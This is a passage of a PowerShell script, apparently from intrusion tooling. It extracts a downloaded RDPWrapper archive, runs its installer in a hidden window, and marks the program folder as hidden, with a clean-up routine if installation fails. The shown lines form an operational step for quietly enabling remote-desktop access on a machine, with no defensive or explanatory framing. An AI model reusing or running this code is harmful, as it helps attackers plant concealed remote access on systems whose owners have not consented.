Write-Host ("[+] Downloaded RDPWrapper to path: {0}. Starting installation." -f $RDP_WRAPPER);Expand-Archive -Path $RDP_WRAPPER -Destination $EXTRACT_DEST -Force;Start-Process ("{0}\RDPWInst.exe" -f $EXTRACT_DEST) -ArgumentList "-i", "-o" -WindowStyle Hidden -Wait;if (!(Test-Path -Path $PROGRAM_FOLDER)){Write-Host "[-] Installation failed.";Invoke-CleanUp};Write-Host ("[*] Installation Succeeded. Setting attribute {0} to hidden." -f $PROGRAM_FOLDER);(Get-Item $PROGRAM_FOLDER).Attributes = "Hidden"